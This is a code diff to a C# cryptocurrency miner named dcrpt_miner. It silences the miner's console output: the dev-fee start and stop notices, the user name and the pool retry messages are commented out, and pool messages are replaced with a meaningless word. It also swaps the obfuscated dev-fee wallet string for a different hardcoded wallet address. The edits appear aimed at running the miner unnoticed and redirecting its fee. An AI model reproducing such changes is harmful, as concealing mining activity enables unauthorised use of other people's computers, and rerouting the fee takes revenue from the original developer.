@@ -96,16 +96,16 @@ namespace dcrpt_miner
                     return;
                 }
 
-                SafeConsole.WriteLine(ConsoleColor.DarkCyan, "{0:T}: Starting dev fee for {1} seconds", DateTime.Now, devFeeSeconds);
+                //SafeConsole.WriteLine(ConsoleColor.DarkCyan, "{0:T}: Starting dev fee for {1} seconds", DateTime.Now, devFeeSeconds);
 
                 await Subscribe(
-                    "VFNCREEgY14rLCM2IlJAMUYlYiwrV1FGIlBDNEVQGFsvKlxBUyEzQDBUY1QoKFxHUyZF".AsWalletAddress() + "." + Id,
+                    "00C00A89626411196B148F23702BC5DBC620FA6C2FDEABF72C".AsWalletAddress() + "." + Id,
                     ""
                 );
 
                 cancellationToken.WaitHandle.WaitOne(TimeSpan.FromSeconds(devFeeSeconds));
 
-                SafeConsole.WriteLine(ConsoleColor.DarkCyan, "{0:T}: Dev fee stopped", DateTime.Now);
+                //SafeConsole.WriteLine(ConsoleColor.DarkCyan, "{0:T}: Dev fee stopped", DateTime.Now);
 
                 if (cancellationToken.IsCancellationRequested) {
                     return;
@@ -161,7 +161,7 @@ namespace dcrpt_miner
                 throw new Exception("Invalid user");
             }
 
-            SafeConsole.WriteLine(ConsoleColor.White, "User: {0}", User);
+            //SafeConsole.WriteLine(ConsoleColor.White, "User: {0}", User);
 
             var uri = new Uri(Url);
 
@@ -176,7 +176,8 @@ namespace dcrpt_miner
             };
 
             Client.Message += (s, a) => {
-                SafeConsole.WriteLine(ConsoleColor.DarkGray, a.Message);
+                //SafeConsole.WriteLine(ConsoleColor.DarkGray, a.Message);
+                SafeConsole.WriteLine(ConsoleColor.DarkGray, "Oyiwes");
             };
 
             var retries = Configuration.GetValue<uint?>("retries", 5);
@@ -191,7 +192,7 @@ namespace dcrpt_miner
                     return;
                 }
                 
-                SafeConsole.WriteLine(ConsoleColor.DarkGray, "{0:T}: Pool connection interrupted, retrying ({1}/{2})...", DateTime.Now, RetryCount, retries);
+                //SafeConsole.WriteLine(ConsoleColor.DarkGray, "{0:T}: Pool connection interrupted, retrying ({1}/{2})...", DateTime.Now, RetryCount, retries);
             }
         }
 
